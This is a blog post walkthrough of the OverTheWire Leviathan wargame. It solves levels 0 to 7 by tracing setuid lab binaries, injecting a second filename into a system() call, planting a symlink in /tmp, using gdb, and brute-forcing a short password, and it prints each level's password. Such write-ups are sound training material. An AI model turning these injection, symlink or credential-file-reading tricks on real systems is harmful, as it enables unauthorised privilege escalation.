@@ -1,0 +1,187 @@
+<!doctype html><html lang=en-us><head><title>OverTheWire: Leviathan | Nikola's Blog</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Blog about Cybersecurity, CTF Writeups and stuff"><meta name=generator content="Hugo 0.80.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link rel=stylesheet href=/css/style.css><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-156479490-3','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body><nav class=navigation><a href=/><span class=arrow>←</span>Home</a>
+<a href=/posts>Archive</a>
+<a href=/tags>Tags</a>
+<a href=/about>About</a>
+<a class=button href=https://knez.github.io/index.xml>Subscribe</a></nav><main class=main><section id=single><h1 class=title>OverTheWire: Leviathan</h1><div class=tip><span>Jun 26, 2021 21:35</span>
+<span class=split>·</span>
+<span>1621 words</span>
+<span class=split>·</span>
+<span>8 minute read</span></div><div class=content><h2 id=level-0--level-1>Level 0 → Level 1 <a href=#level-0--level-1 class=anchor>🔗</a></h2><p>Quick <code>find</code> on the current folder reveals hidden folder <code>backup</code></p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ find .
+.          
+./.bash_logout
+./.backup
+./.backup/bookmarks.html
+./.profile
+./.bashrc
+</code></pre></div><p>Within it, there is a file <code>bookmarks.html</code> containing bookmarks in the old Netscape file format.</p><p>Let&rsquo;s do a quick grep on that file</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>$ grep -i Password .backup/bookmarks.html --color=auto 
+&lt;<span style=color:green;font-weight:700>DT</span>&gt;&lt;<span style=color:green;font-weight:700>A</span> <span style=color:#b44>HREF</span><span style=color:#666>=</span><span style=color:#b44>&#34;http://leviathan.labs.overthewire.org/passwordus.html | This will 
+</span><span style=color:#b44>be fixed later, the password for leviathan1 is rioGegei8m&#34;</span> <span style=color:#b44>ADD_DATE</span><span style=color:#666>=</span><span style=color:#b44>&#34;1155384634&#34;</span> 
+<span style=color:#b44>LAST_CHARSET</span><span style=color:#666>=</span><span style=color:#b44>&#34;ISO-8859-1&#34;</span> <span style=color:#b44>ID</span><span style=color:#666>=</span><span style=color:#b44>&#34;rdf:#$2wIU71&#34;</span>&gt;password to leviathan1&lt;/<span style=color:green;font-weight:700>A</span>&gt;
+</code></pre></div><p>Answer: <strong>rioGegei8m</strong></p><h2 id=level-1--level-2>Level 1 → Level 2 <a href=#level-1--level-2 class=anchor>🔗</a></h2><p>In the current folder, there is a binary file <code>check</code></p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ls -l
+total <span style=color:#666>8</span>
+-r-sr-x--- <span style=color:#666>1</span> leviathan2 leviathan1 <span style=color:#666>7452</span> Aug <span style=color:#666>26</span>  <span style=color:#666>2019</span> check
+</code></pre></div><p>Notice, it has a <strong>setuid</strong> flag set. This means it is executing with the permissions of the owner of that file. In this case, it is leviathan2. This is dangerous. If we can somehow cause this program to misbehave, we can use it to print out the password in the <code>/etc/leviathan_pass</code> directory.</p><p>Running the program:</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ./check
+password: abc
+Wrong password, Good Bye ...
+</code></pre></div><p>Let&rsquo;s do a quick static analysis of the binary</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ file ./check
+./check: setuid ELF 32-bit LSB executable, Intel 80386, version <span style=color:#666>1</span> <span style=color:#666>(</span>SYSV<span style=color:#666>)</span>,
+ dynamically linked, interpreter /lib/ld-linux.so.2, <span style=color:#a2f;font-weight:700>for</span> GNU/Linux 2.6.32, 
+ BuildID<span style=color:#666>[</span>sha1<span style=color:#666>]=</span>c735f6f3a3a94adcad8407cc0fda40496fd765dd, not stripped
+</code></pre></div><p>It is a 32-bit dynamically linked program.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ objdump -T ./check
+check:     file format elf32-i386
+
+DYNAMIC SYMBOL TABLE:
+<span style=color:#666>00000000</span>      DF *UND*	<span style=color:#666>00000000</span>  GLIBC_2.0   strcmp
+<span style=color:#666>00000000</span>      DF *UND*	<span style=color:#666>00000000</span>  GLIBC_2.0   <span style=color:#a2f>printf</span>
+<span style=color:#666>00000000</span>      DF *UND*	<span style=color:#666>00000000</span>  GLIBC_2.0   getchar
+<span style=color:#666>00000000</span>      DF *UND*	<span style=color:#666>00000000</span>  GLIBC_2.0   geteuid
+<span style=color:#666>00000000</span>      DF *UND*	<span style=color:#666>00000000</span>  GLIBC_2.0   puts
+<span style=color:#666>00000000</span>      DF *UND*	<span style=color:#666>00000000</span>  GLIBC_2.0   system
+<span style=color:#666>00000000</span>  w   D  *UND*	<span style=color:#666>00000000</span>              __gmon_start__
+<span style=color:#666>00000000</span>      DF *UND*	<span style=color:#666>00000000</span>  GLIBC_2.0   setreuid
+<span style=color:#666>00000000</span>      DF *UND*	<span style=color:#666>00000000</span>  GLIBC_2.0   __libc_start_main
+0804868c g    DO .rodata	<span style=color:#666>00000004</span>  Base        _IO_stdin_used
+</code></pre></div><p>These are all the functions there are called from within the program. We see a <code>getchar</code> function, which processes our input byte by byte. Then there is <code>strcmp</code> function, which is directly responsible for comparing our password with the correct password. Finally, <code>system</code> executes a system command, given as a first argument.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ strings ./check | less
+...
+password: 
+/bin/sh
+Wrong password, Good Bye ...
+...
+</code></pre></div><p>The presence of the string <code>/bin/sh</code> indicates probable spawning of a shell (using the <code>system</code> function) once given the correct password.</p><p>To get the actual password, we can use the linux utility <code>ltrace</code>. Since the app uses shared libraries, we will use <code>ltrace</code> to <strong>dynamically</strong> intercept all library calls made by the app, and print out their arguments and return values.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ <span style=color:#a2f>echo</span> <span style=color:#b44>&#39;abc&#39;</span> | ltrace ./check
+__libc_start_main<span style=color:#666>(</span>0x804853b, 1, 0xffffd734, 0x8048610 &lt;unfinished ...&gt;
+printf<span style=color:#666>(</span><span style=color:#b44>&#34;password: &#34;</span><span style=color:#666>)</span>                                                 <span style=color:#666>=</span> <span style=color:#666>10</span>
+getchar<span style=color:#666>(</span>1, 0, 0x65766f6c, 0x646f6700<span style=color:#666>)</span>                                <span style=color:#666>=</span> <span style=color:#666>97</span>
+getchar<span style=color:#666>(</span>1, 0, 0x65766f6c, 0x646f6700<span style=color:#666>)</span>                                <span style=color:#666>=</span> <span style=color:#666>98</span>
+getchar<span style=color:#666>(</span>1, 0, 0x65766f6c, 0x646f6700<span style=color:#666>)</span>                                <span style=color:#666>=</span> <span style=color:#666>99</span>
+strcmp<span style=color:#666>(</span><span style=color:#b44>&#34;abc&#34;</span>, <span style=color:#b44>&#34;sex&#34;</span><span style=color:#666>)</span>                                                 <span style=color:#666>=</span> -1
+puts<span style=color:#666>(</span><span style=color:#b44>&#34;Wrong password, Good Bye ...&#34;</span>password: Wrong password, Good Bye ...
+<span style=color:#666>)</span>                                     <span style=color:#666>=</span> <span style=color:#666>29</span>
++++ exited <span style=color:#666>(</span>status 0<span style=color:#666>)</span> +++
+</code></pre></div><p>The password is clearly visible as the second argument to the <code>strcmp</code> function.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leviathan1@leviathan:~$ ./check
+password: sex
+$ whoami
+leviathan2
+$ cat /etc/leviathan_pass/leviathan2 
+ougahZi8Ta
+</code></pre></div><p>Alternatively, since the password is composed of only 3 characters, we can brute-force it in a reasonable time frame.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#080>#!/bin/bash
+</span><span style=color:#080></span>
+<span style=color:#a2f;font-weight:700>for</span> pass in <span style=color:#666>{</span>a..z<span style=color:#666>}{</span>a..z<span style=color:#666>}{</span>a..z<span style=color:#666>}</span>
+<span style=color:#a2f;font-weight:700>do</span>
+    <span style=color:#a2f>echo</span> -n -e <span style=color:#b44>&#34;Trying out password: </span><span style=color:#b68;font-weight:700>${</span><span style=color:#b8860b>pass</span><span style=color:#b68;font-weight:700>}</span><span style=color:#b44>\r&#34;</span>
+    <span style=color:#b8860b>out</span><span style=color:#666>=</span><span style=color:#b44>`</span><span style=color:#a2f>echo</span> <span style=color:#b8860b>$pass</span> | <span style=color:#b8860b>$HOME</span>/check<span style=color:#b44>`</span>
+    <span style=color:#a2f;font-weight:700>if</span> <span style=color:#666>[[</span> <span style=color:#b8860b>$out</span> !<span style=color:#666>=</span> *<span style=color:#b44>&#34;Wrong&#34;</span>* <span style=color:#666>]]</span>;
+    <span style=color:#a2f;font-weight:700>then</span>
+        <span style=color:#a2f>echo</span> -e <span style=color:#b44>&#34;\nFound password: &#39;</span><span style=color:#b8860b>$pass</span><span style=color:#b44>&#39;&#34;</span>
+        break;
+    <span style=color:#a2f;font-weight:700>fi</span>
+    sleep 0.01
+<span style=color:#a2f;font-weight:700>done</span>
+</code></pre></div><p>Total search time: under 3 minutes</p><p>Answer: <strong>ougahZi8Ta</strong></p><h2 id=level-2--level-3>Level 2 → Level 3 <a href=#level-2--level-3 class=anchor>🔗</a></h2><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ls -l 
+-r-sr-x--- <span style=color:#666>1</span> leviathan3 leviathan2 <span style=color:#666>7436</span> Aug <span style=color:#666>26</span>  <span style=color:#666>2019</span> printfile
+</code></pre></div><p>Again, we have a binary with a setuid flag set.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ./printfile
+*** File Printer ***
+Usage: ./printfile filename
+
+$ ./printfile /etc/leviathan_pass/leviathan3
+You cant have that file...
+</code></pre></div><p>Fair enough. It looks like there is some kind of permission check in place.</p><p>Let&rsquo;s dig deeper and perform some library tracing. We&rsquo;ll use the file <code>/etc/hostname</code> as our argument, since we have read access to that file.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ltrace ./printfile /etc/hostname
+__libc_start_main<span style=color:#666>(</span>0x804852b, 2, 0xffffd704, 0x8048610 &lt;unfinished ...&gt;
+access<span style=color:#666>(</span><span style=color:#b44>&#34;/etc/hostname&#34;</span>, 4<span style=color:#666>)</span>                                               <span style=color:#666>=</span> <span style=color:#666>0</span>
+snprintf<span style=color:#666>(</span><span style=color:#b44>&#34;/bin/cat /etc/hostname&#34;</span>, 511, <span style=color:#b44>&#34;/bin/cat %s&#34;</span>, <span style=color:#b44>&#34;/etc/hostname&#34;</span><span style=color:#666>)</span>  <span style=color:#666>=</span> <span style=color:#666>22</span>
+geteuid<span style=color:#666>()</span>                                                                <span style=color:#666>=</span> <span style=color:#666>12002</span>
+geteuid<span style=color:#666>()</span>                                                                <span style=color:#666>=</span> <span style=color:#666>12002</span>
+setreuid<span style=color:#666>(</span>12002, 12002<span style=color:#666>)</span>                                                   <span style=color:#666>=</span> <span style=color:#666>0</span>
+system<span style=color:#666>(</span><span style=color:#b44>&#34;/bin/cat /etc/hostname&#34;</span>leviathan &lt;no <span style=color:#a2f;font-weight:700>return</span> ...&gt;
+--- SIGCHLD <span style=color:#666>(</span>Child exited<span style=color:#666>)</span> ---
+&lt;... system resumed&gt; <span style=color:#666>)</span>                                                   <span style=color:#666>=</span> <span style=color:#666>0</span>
++++ exited <span style=color:#666>(</span>status 0<span style=color:#666>)</span> +++
+</code></pre></div><p>There are several things going on here. First, we see a call to <code>access()</code> function. This function simply recieves our input string, and checks if we have required permissions to read that file.
+If so, it then calls <code>snprintf()</code> to construct a command to be executed later with a call to <code>system()</code>.
+The executed command is really just <code>/bin/cat</code> followed by any input we provide. This part is vulnerable to code injection.</p><p>The idea is to first get past the <code>access()</code> function, while at the same time forcing <code>/bin/cat</code> to print out the password. This can be done by carefully crafting the input string.</p><p>Prepare working directory:</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ mktemp -d
+/tmp/tmp.FR2DP3gS0e
+</code></pre></div><p>Create the payload:</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ touch <span style=color:#b44>&#39;/tmp/tmp.FR2DP3gS0e/a leviathan3&#39;</span> 
+</code></pre></div><p>Switch to directory where the password is located</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ <span style=color:#a2f>cd</span> /etc/leviathan_pass
+</code></pre></div><p>And finally, call the <code>printfile</code> with our newly created payload</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>/etc/leviathan_pass$ ~/printfile <span style=color:#b44>&#39;/tmp/tmp.FR2DP3gS0e/a leviathan3&#39;</span>
+/bin/cat: /tmp/tmp.FR2DP3gS0e/a: Permission denied
+Ahdiemoo1j
+</code></pre></div><p>Pwned!</p><p>Let&rsquo;s break things up</p><p>By providing a string &lsquo;/tmp/tmp.FR2DP3gS0e/a leviathan3&rsquo;, we are effectively getting through the <code>access</code> function, since such file really does exist, and we have permission to read it.</p><p>Next, the <code>snprintf</code> constructs a command to be executed, which results in the command &lsquo;/bin/cat /tmp/tmp.FR2DP3gS0e/a leviathan3&rsquo; (two files to be printed!)</p><p>Then, a <code>system</code> call will execute this command. Cat obviously fails on the first file, but will successfully print the second one. The reason is because <code>system</code> is being called from the current directory, the file <em>leviathan3</em> exist there, and we have right permissions (due to setuid)</p><p>Answer: <strong>Ahdiemoo1j</strong></p><h2 id=level-3--level-4>Level 3 → Level 4 <a href=#level-3--level-4 class=anchor>🔗</a></h2><p>Running <code>level3</code> program</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ./level3
+Enter the password&gt; aaa   
+bzzzzzzzzap. WRONG
+</code></pre></div><p>Running it again through <code>ltrace</code></p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ltrace ./level3
+__libc_start_main<span style=color:#666>(</span>0x8048618, 1, 0xffffd744, 0x80486d0 &lt;unfinished ...&gt;
+strcmp<span style=color:#666>(</span><span style=color:#b44>&#34;h0no33&#34;</span>, <span style=color:#b44>&#34;kakaka&#34;</span><span style=color:#666>)</span>                                           <span style=color:#666>=</span> -1
+printf<span style=color:#666>(</span><span style=color:#b44>&#34;Enter the password&gt; &#34;</span><span style=color:#666>)</span>                                       <span style=color:#666>=</span> <span style=color:#666>20</span>
+fgets<span style=color:#666>(</span>Enter the password&gt; aaa
+<span style=color:#b44>&#34;aaa\n&#34;</span>, 256, 0xf7fc55a0<span style=color:#666>)</span>                                    <span style=color:#666>=</span> 0xffffd550
+strcmp<span style=color:#666>(</span><span style=color:#b44>&#34;aaa\n&#34;</span>, <span style=color:#b44>&#34;snlprintf\n&#34;</span><span style=color:#666>)</span>                                       <span style=color:#666>=</span> -1
+puts<span style=color:#666>(</span><span style=color:#b44>&#34;bzzzzzzzzap. WRONG&#34;</span>bzzzzzzzzap. WRONG
+<span style=color:#666>)</span>                                               <span style=color:#666>=</span> <span style=color:#666>19</span>
++++ exited <span style=color:#666>(</span>status 0<span style=color:#666>)</span> +++
+</code></pre></div><p>Same as before, we use the elevated shell to print the password</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ./level3 
+Enter the password&gt; snlprintf
+<span style=color:#666>[</span>You<span>&#39;</span>ve got shell<span style=color:#666>]</span>!
+$ cat /etc/leviathan_pass/leviathan4
+vuH0coox6m
+</code></pre></div><p>Answer: <strong>vuH0coox6m</strong></p><h2 id=level-4--level-5>Level 4 → Level 5 <a href=#level-4--level-5 class=anchor>🔗</a></h2><p>Using <code>find</code>, we find a hidden binary <code>.trash/bin</code></p><p>When run, it spits out a sequence of numbers encoded in binary</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ./.trash/bin
+<span style=color:#666>01010100</span> <span style=color:#666>01101001</span> <span style=color:#666>01110100</span> <span style=color:#666>01101000</span> <span style=color:#666>00110100</span>
+<span style=color:#666>01100011</span> <span style=color:#666>01101111</span> <span style=color:#666>01101011</span> <span style=color:#666>01100101</span> <span style=color:#666>01101001</span> <span style=color:#666>00001010</span>
+</code></pre></div><p>We need to convert each number to their ASCII representation. This can easily be achieved in python with this one-liner.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ./.trash/bin | python3 -c <span>&#39;</span><span style=color:#a2f;font-weight:700>for</span> x in input<span style=color:#666>()</span>.split<span style=color:#666>()</span>: print<span style=color:#666>(</span>chr<span style=color:#666>(</span>int<span style=color:#666>(</span>x, 2<span style=color:#666>))</span>, <span style=color:#b8860b>end</span><span style=color:#666>=</span><span style=color:#b44>&#34;&#34;</span><span style=color:#666>)</span>
+Tith4cokei
+</code></pre></div><p>Answer: <strong>Tith4cokei</strong></p><h2 id=level-5--level-6>Level 5 → Level 6 <a href=#level-5--level-6 class=anchor>🔗</a></h2><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ./leviathan5
+Cannot find /tmp/file.log
+</code></pre></div><p>Let&rsquo;s create a dummy file, and run it again</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ <span style=color:#a2f>echo</span> hi &gt; /tmp/file.log
+$ ./leviathan5
+hi
+</code></pre></div><p>It&rsquo;s printing out the contents back. One more time with <code>ltrace</code></p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ <span style=color:#a2f>echo</span> hi &gt; /tmp/file.log
+$ ltrace ./leviathan5
+__libc_start_main<span style=color:#666>(</span>0x80485db, 1, 0xffffd734, 0x80486a0 &lt;unfinished ...&gt;
+fopen<span style=color:#666>(</span><span style=color:#b44>&#34;/tmp/file.log&#34;</span>, <span style=color:#b44>&#34;r&#34;</span><span style=color:#666>)</span>                                   <span style=color:#666>=</span> 0x804b008
+fgetc<span style=color:#666>(</span>0x804b008<span style=color:#666>)</span>                                                  <span style=color:#666>=</span> <span style=color:#b44>&#39;h&#39;</span>
+feof<span style=color:#666>(</span>0x804b008<span style=color:#666>)</span>                                                   <span style=color:#666>=</span> <span style=color:#666>0</span>
+putchar<span style=color:#666>(</span>104, 0x8048720, 0xf7e40890, 0x80486eb<span style=color:#666>)</span>                    <span style=color:#666>=</span> <span style=color:#666>104</span>
+fgetc<span style=color:#666>(</span>0x804b008<span style=color:#666>)</span>                                                  <span style=color:#666>=</span> <span style=color:#b44>&#39;i&#39;</span>
+feof<span style=color:#666>(</span>0x804b008<span style=color:#666>)</span>                                                   <span style=color:#666>=</span> <span style=color:#666>0</span>
+putchar<span style=color:#666>(</span>105, 0x8048720, 0xf7e40890, 0x80486eb<span style=color:#666>)</span>                    <span style=color:#666>=</span> <span style=color:#666>105</span>
+fgetc<span style=color:#666>(</span>0x804b008<span style=color:#666>)</span>                                                  <span style=color:#666>=</span> <span style=color:#b44>&#39;\n&#39;</span>
+feof<span style=color:#666>(</span>0x804b008<span style=color:#666>)</span>                                                   <span style=color:#666>=</span> <span style=color:#666>0</span>
+putchar<span style=color:#666>(</span>10, 0x8048720, 0xf7e40890, 0x80486ebhi
+<span style=color:#666>)</span>                     <span style=color:#666>=</span> <span style=color:#666>10</span>
+fgetc<span style=color:#666>(</span>0x804b008<span style=color:#666>)</span>                                                  <span style=color:#666>=</span> <span style=color:#b44>&#39;\377&#39;</span>
+feof<span style=color:#666>(</span>0x804b008<span style=color:#666>)</span>                                                   <span style=color:#666>=</span> <span style=color:#666>1</span>
+fclose<span style=color:#666>(</span>0x804b008<span style=color:#666>)</span>                                                 <span style=color:#666>=</span> <span style=color:#666>0</span>
+getuid<span style=color:#666>()</span>                                                          <span style=color:#666>=</span> <span style=color:#666>12005</span>
+setuid<span style=color:#666>(</span>12005<span style=color:#666>)</span>                                                     <span style=color:#666>=</span> <span style=color:#666>0</span>
+unlink<span style=color:#666>(</span><span style=color:#b44>&#34;/tmp/file.log&#34;</span><span style=color:#666>)</span>                                           <span style=color:#666>=</span> <span style=color:#666>0</span>
++++ exited <span style=color:#666>(</span>status 0<span style=color:#666>)</span> +++
+</code></pre></div><p>Now it&rsquo;s clear what it does. It opens the file and reads it char by char and prints each character. Finally, the file is deleted with the <code>unlink</code> function.</p><p>To get the password for this level, we can make a symlink pointing to the password file. The program will happily follow the symlink, and print out the contents of it.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+$ ls -l /tmp/file.log
+lrwxrwxrwx <span style=color:#666>1</span> leviathan5 root <span style=color:#666>30</span> Jun <span style=color:#666>26</span> 18:53 /tmp/file.log -&gt; /etc/leviathan_pass/leviathan6
+$ ./leviathan5
+UgaoFee4li
+</code></pre></div><p>Answer: <strong>UgaoFee4li</strong></p><h2 id=level-6--level-7>Level 6 → Level 7 <a href=#level-6--level-7 class=anchor>🔗</a></h2><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ./leviathan6
+usage: ./leviathan6 &lt;<span style=color:#666>4</span> digit code&gt;
+</code></pre></div><p>Again with <code>ltrace</code> and a some 4 digit number</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ltrace ./leviathan6 <span style=color:#666>1337</span>
+__libc_start_main<span style=color:#666>(</span>0x804853b, 2, 0xffffd734, 0x80485e0 &lt;unfinished ...&gt;
+atoi<span style=color:#666>(</span>0xffffd866, 0, 0xf7e40890, 0x804862b<span style=color:#666>)</span>                        <span style=color:#666>=</span> <span style=color:#666>1337</span>
+puts<span style=color:#666>(</span><span style=color:#b44>&#34;Wrong&#34;</span>Wrong
+<span style=color:#666>)</span>                                                            <span style=color:#666>=</span> <span style=color:#666>6</span>
++++ exited <span style=color:#666>(</span>status 0<span style=color:#666>)</span> +++<span style=color:#b44>```</span>
+</code></pre></div><p>The input string gets convert to number with the <code>atoi</code> function. This number is then compared with the right password (number). However, we can&rsquo;t see this using <code>ltrace</code>, as comparison is done purely between two numbers. There is no library call involved here.</p><p>Rather than brute-forcing the password, a better approach would be to load the binary in <code>gdb</code>, set a breakpoint to <code>main</code>, and step through the assembly code until we get to the actual comparison of two integers.</p><p>Then it is just a matter of displaying the memory contents of the integer we are interested in.</p><p>We need to:</p><ul><li>Fire up gdb including program arguments</li><li>Set breakpoint to main function</li><li>Enable registers and assembly code view</li><li>Run the code</li></ul><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ gdb --args ./leviathan6 <span style=color:#666>1337</span>
+<span style=color:#666>(</span>gdb<span style=color:#666>)</span> b main
+Breakpoint <span style=color:#666>1</span> at 0x804854a
+<span style=color:#666>(</span>gdb<span style=color:#666>)</span> layout reg
+<span style=color:#666>(</span>gdb<span style=color:#666>)</span> r
+Starting program: /home/leviathan6/leviathan6 <span style=color:#666>1337</span>
+
+Breakpoint 1, 0x0804854a in main <span style=color:#666>()</span>
+<span style=color:#666>(</span>gdb<span style=color:#666>)</span>
+</code></pre></div><p>Next, we will repeatedly step through the code with the <code>ni</code> command, until we get to the <code>cmp</code> instruction. This is the instruction that does the actual comparison.</p><p><p class=markdown-image><img src=/images/overthewire-leviathan/gdb.png alt=gdb title=gdb></p></p><p>The instruction <code>cmp</code> takes two operands. The first is the memory address where the actual password is stored. The second operand is our input number, which is stored in the <code>EAX</code> register (as seen on the top left).</p><p>At this point, all wee need to do, is peek inside the first operand&rsquo;s address to get the password.</p><p>Before printing the number, the address first needs to be casted to integer pointer and then dereferenced (same as with C pointers)</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#666>(</span>gdb<span style=color:#666>)</span> p *<span style=color:#666>(</span>int *<span style=color:#666>)(</span><span style=color:#b8860b>$ebp</span>-0xc<span style=color:#666>)</span>
+<span style=color:#b8860b>$4</span> <span style=color:#666>=</span> <span style=color:#666>7123</span>
+</code></pre></div><p>Now let&rsquo;s git that shell</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leviathan6@leviathan:~$ ./leviathan6 <span style=color:#666>7123</span>
+$ cat /etc/leviathan_pass/leviathan7
+ahy7MaeBo9
+</code></pre></div><p>Answer: <strong>ahy7MaeBo9</strong></p></div><div class=tags><a href=https://knez.github.io/tags/overthewire>overthewire</a>
+<a href=https://knez.github.io/tags/binary-exploitation>binary-exploitation</a></div><div id=comment><div id=disqus_thread></div><script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return;}
+var d=document,s=d.createElement('script');s.async=true;s.src='//'+"hackerfiles"+'.disqus.com/embed.js';s.setAttribute('data-timestamp',+new Date());(d.head||d.body).appendChild(s);})();</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div></section></main><footer id=footer><div id=social><a class=symbol href=https://github.com/knez target=_blank><svg fill="#bbb" width="28" height="28" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title>Github</title><desc>Created with Sketch.</desc><defs/><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)"><g id="Github" transform="translate(264.000000, 939.000000)"><path d="M8 72H64C68.418278 72 72 68.418278 72 64V8c0-4.418278-3.581721999999999-8-8-8H8c-4.418278 811624501e-24-8 3.581722-8 8V64C541083001e-24 68.418278 3.581722 72 8 72z" id="Rounded" fill="#bbb"/><path d="M35.9985 13C22.746 13 12 23.7870921 12 37.096644 12 47.7406712 18.876 56.7718301 28.4145 59.9584121 29.6145 60.1797862 30.0525 59.4358488 30.0525 58.7973276 30.0525 58.2250681 30.0315 56.7100863 30.0195 54.6996482 23.343 56.1558981 21.9345 51.4693938 21.9345 51.4693938 20.844 48.6864054 19.2705 47.9454799 19.2705 47.9454799 17.091 46.4500754 19.4355 46.4801943 19.4355 46.4801943 21.843 46.6503662 23.1105 48.9634994 23.1105 48.9634994 25.2525 52.6455377 28.728 51.5823398 30.096 50.9649018 30.3135 49.4077535 30.9345 48.3460615 31.62 47.7436831 26.2905 47.1352808 20.688 45.0691228 20.688 35.8361671 20.688 33.2052792 21.6225 31.0547881 23.1585 29.3696344 22.911 28.7597262 22.0875 26.3110578 23.3925 22.9934585 23.3925 22.9934585 25.4085 22.3459017 29.9925 25.4632101 31.908 24.9285993 33.96 24.6620468 36.0015 24.6515052 38.04 24.6620468 40.0935 24.9285993 42.0105 25.4632101 46.5915 22.3459017 48.603 22.9934585 48.603 22.9934585 49.9125 26.3110578 49.089 28.7597262 48.8415 29.3696344 50.3805 31.0547881 51.309 33.2052792 51.309 35.8361671 51.309 45.0917119 45.6975 47.1292571 40.3515 47.7256117 41.2125 48.4695491 41.9805 49.9393525 41.9805 52.1877301 41.9805 55.4089489 41.9505 58.0067059 41.9505 58.7973276 41.9505 59.4418726 42.3825 60.1918338 43.6005 59.9554002 53.13 56.7627944 60 47.7376593 60 37.096644 60 23.7870921 49.254 13 35.9985 13" fill="#fff"/></g></g></g></svg></a></div><p class=copyright>© Copyright
+2021
